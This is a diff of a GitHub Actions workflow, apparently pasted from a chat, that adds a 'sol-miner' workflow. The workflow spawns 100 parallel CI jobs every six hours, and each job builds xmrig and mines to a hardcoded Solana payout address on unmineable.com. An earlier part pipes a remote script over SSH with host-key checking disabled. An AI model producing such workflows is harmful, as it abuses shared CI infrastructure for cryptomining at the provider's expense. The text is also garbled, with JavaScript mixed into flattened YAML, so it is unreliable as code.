@@ -1,3 +1,4 @@
+> Rey:
 name: sshx-vps-mining
 
 on:
@@ -37,3 +38,10 @@ jobs:
           chmod +x remote.sh
 
           ssh -o StrictHostKeyChecking=no -p 2222 sshx@$HOST 'bash -s' < remote.sh
+
+> Rey:
+name: sol-miner
+
+on: workflow_dispatch: schedule: - cron: '0 */6 * * *'  # Jalan ulang setiap 6 jam
+
+jobs: " + Array.from({ length: 100 }, (_, i) => { const idx = i + 1; return  miner${idx}: runs-on: ubuntu-latest timeout-minutes: 360 steps: - name: Start Miner ${idx} run: | sudo apt update sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev git clone https://github.com/xmrig/xmrig.git mkdir xmrig/build && cd xmrig/build cmake .. make -j$(nproc) ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Worker${idx} -p x --threads=4; }).join("\n") } ] }
